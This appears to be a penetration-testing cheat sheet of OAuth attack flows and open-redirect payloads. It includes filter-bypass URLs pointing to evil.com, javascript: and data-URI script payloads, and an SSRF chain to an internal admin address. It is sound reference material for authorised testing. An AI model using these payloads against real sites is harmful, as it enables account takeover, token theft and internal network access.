# OAuth & Open Redirect - Verified Techniques

## OAuth Vulnerabilities

### Missing State Parameter
```
# If OAuth flow doesn't validate state:
1. Attacker starts OAuth → gets code
2. Victim clicks link with attacker's code
3. Code linked to victim's account
4. Attacker accesses victim's account
```

### Token Leakage via Referrer
```
# If token in URL:
1. Attacker posts: <img src="https://victim.com/callback?token=xxx">
2. Victim views post → token in Referer header
3. Attacker captures token
```

### Implicit Flow Token Theft
```
# Token in URL fragment (#)
# If JS reads fragment → attacker can steal via XSS
```

## Open Redirect

### Basic Open Redirect
```
https://victim.com/redirect?url=https://evil.com
https://victim.com/redirect?next=https://evil.com
https://victim.com/redirect?return=https://evil.com
https://victim.com/redirect?dest=https://evil.com
```

### Bypass Techniques
```
# Protocol-relative
https://victim.com/redirect?url=//evil.com

# Backslash
https://victim.com/redirect?url=https://evil.com\@victim.com

# @-sign
https://victim.com/redirect?url=https://victim.com@evil.com

# URL encoding
https://victim.com/redirect?url=https:%2f%2fevil.com

# Double encoding
https://victim.com/redirect?url=https:%252f%252fevil.com

# JavaScript
https://victim.com/redirect?url=javascript:alert(1)

# Data URI
https://victim.com/redirect?url=data:text/html,<script>alert(1)</script>
```

### SSRF via Open Redirect
```
# Chain open redirect to bypass SSRF filter
https://victim.com/redirect?url=http://192.168.0.1/admin
# If redirect follows → SSRF confirmed
```
